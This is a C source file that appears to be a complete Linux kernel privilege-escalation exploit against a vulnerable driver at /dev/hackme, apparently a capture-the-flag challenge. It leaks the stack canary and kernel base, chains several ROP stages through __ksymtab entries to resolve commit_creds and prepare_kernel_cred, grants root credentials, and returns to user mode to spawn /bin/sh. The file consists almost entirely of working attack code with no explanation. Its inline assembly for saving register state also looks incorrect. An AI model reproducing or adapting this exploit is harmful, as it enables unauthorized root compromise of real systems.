#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>
 
 
// commands
#define DEV_PATH "/dev/hackme"   // the path the device is placed
 
// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)
 
// globals
// (END globals)
 
 
// utils
#define WAIT getc(stdin);
#define REP(N) for(int iiiiix=0;iiiiix!=N;++iiiiix)
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  printf("[!!!] NIRUGIRI!!!\n");
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
// should compile with -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
  printf("[+] save_state: cs:%lx ss:%lx sp:%lx rflags:%lx\n", user_cs, user_ss, user_sp, user_rflags);
}
 
static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}
// (END utils)
 
// hackme
int _write(int fd, char *buf, uint size){
  assert(fd > 0);
  int res = write(fd, buf, size);
  assert(res >= 0);
  return res;
}
int _read(int fd, char *buf, uint size){
  assert(fd > 0);
  int res = read(fd, buf, size);
  assert(res >= 0);
  return res;
}
// (END hackme)
 
#define CANARY_OFF 0x80
#define RBP_OFF 0x98
int fd;
ulong kernbase;
ulong commit_creds, prepare_kernel_cred, current_task;
ulong canary;
char rbuf[0x200];
char wbuf[0x200];
 
void level3(void){
  ulong ret;
  asm(
      "movq %0, %%rax\n"
      : "=r"(ret)
  );
  const ulong my_special_cred = ret;
  printf("[!] reached Level-3\n");
  printf("[!] my_special_cred: 0x%lx\n", my_special_cred);
 
  // into level4
  save_state();
  ulong *c = &wbuf[CANARY_OFF];
  memset(wbuf, 'A', 0x200);
  *c++ = canary;
  *c++ = '1'; // rbx
  *c++ = '2'; // r12
  *c++ = '3'; // rbp
  *c++ = kernbase + 0x006370; // pop rdi
  *c++ = my_special_cred;
  *c++ = commit_creds;
  *c++ = kernbase + 0x200f23; // go home(swapgs & iretq)
  for(int ix=0; ix!=5; ++ix) // rcx, rdx, rsi, rdi, none
    *c++ = 'A' + ix + 1;
  *c++ = &NIRUGIRI;
  *c++ = user_cs;
  *c++ = user_rflags;
  *c++ = user_sp;
  *c++ = user_ss;
  _write(fd, wbuf, 0x130);
 
  errExit("level3");
}
 
void level2(void){
  ulong ret;
  asm(
      "movq %0, %%rax\n"
      : "=r"(ret)
  );
  prepare_kernel_cred = (signed long)kernbase + (signed long)0xf8d4fc + (signed int)ret;
  printf("[!] reached Level-2\n");
  printf("[!] prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);
 
  // into level3
  save_state();
  ulong *c = &wbuf[CANARY_OFF];
  memset(wbuf, 'A', 0x200);
  *c++ = canary;
  *c++ = '1'; // rbx
  *c++ = '2'; // r12
  *c++ = '3'; // rbp
  *c++ = kernbase + 0x006370; // pop rdi
  *c++ = 0;
  *c++ = prepare_kernel_cred;
  *c++ = kernbase + 0x200f23; // go home(swapgs & iretq)
  printf("[!!!] 0x%lx\n", *(c-1));;
  for(int ix=0; ix!=5; ++ix) // rcx, rdx, rsi, rdi, none
    *c++ = 'A' + ix + 1;
  *c++ = &level3;
  *c++ = user_cs;
  *c++ = user_rflags;
  *c++ = user_sp;
  *c++ = user_ss;
  _write(fd, wbuf, 0x130);
 
  errExit("level2");
}
 
void level1(void){
  ulong ret;
  asm(
      "movq %0, %%rax\n"
      : "=r"(ret)
  );
  commit_creds = (signed long)kernbase + (signed long)0xf87d90 + (signed int)ret;
  printf("[!] reached Level-1\n");
  printf("[!] commit_creds: 0x%lx\n", commit_creds);
 
  // into level2
  save_state();
  ulong *c = &wbuf[CANARY_OFF];
  memset(wbuf, 'A', 0x200);
  *c++ = canary;
  *c++ = '1'; // rbx
  *c++ = '2'; // r12
  *c++ = '3'; // rbp
  *c++ = kernbase + 0x4D11; // pop rax
  *c++ = kernbase + 0xf8d4fc; // __ksymtab_prepare_kernel_cred
  *c++ = kernbase + 0x015a80; // mov eax, dword[rax]; pop rbp;
  *c++ = 'A'; // rbp
  *c++ = kernbase + 0x200f23; // go home(swapgs & iretq)
  for(int ix=0; ix!=5; ++ix) // rcx, rdx, rsi, rdi, none
    *c++ = 'A' + ix + 1;
  *c++ = &level2;
  *c++ = user_cs;
  *c++ = user_rflags;
  *c++ = user_sp;
  *c++ = user_ss;
  _write(fd, wbuf, 0x130);
 
  errExit("level1");
}
 
int main(int argc, char *argv[]) {
  printf("[.] NIRUGIRI @ %p\n", &NIRUGIRI);
  printf("[.] level1 @ %p\n", &level1);
  memset(wbuf, 'A', 0x200);
  memset(rbuf, 'B', 0x200);
  fd = open(DEV_PATH, O_RDWR);
  assert(fd > 0);
 
  // leak canary and kernbase
  _read(fd, rbuf, 0x1a0);
  canary = ((ulong*)rbuf)[0x10/8];
  printf("[+] canary: %lx\n", canary);
  kernbase = ((ulong*)rbuf)[38] - ((ulong)0xffffffffb080a157 - (ulong)0xffffffffb0800000);
  printf("[!] kernbase: 0x%lx\n", kernbase);
 
  // leak symbols from __ksymtab_xxx
  save_state();
  ulong *c = &wbuf[CANARY_OFF];
  memset(wbuf, 'A', 0x200);
  *c++ = canary;
  *c++ = '1'; // rbx
  *c++ = '2'; // r12
  *c++ = '3'; // rbp
  *c++ = kernbase + 0x4D11; // pop rax
  *c++ = kernbase + 0xf87d90; // __ksymtab_commit_creds
  *c++ = kernbase + 0x015a80; // mov eax, dword[rax]; pop rbp;
  *c++ = 'A'; // rbp
  *c++ = kernbase + 0x200f23; // go home(swapgs & iretq)
  for(int ix=0; ix!=5; ++ix) // rcx, rdx, rsi, rdi, none
    *c++ = 'A' + ix + 1;
  *c++ = &level1;
  *c++ = user_cs;
  *c++ = user_rflags;
  *c++ = user_sp;
  *c++ = user_ss;
  _write(fd, wbuf, 0x130);
 
  errExit("main");
  return 0;
}
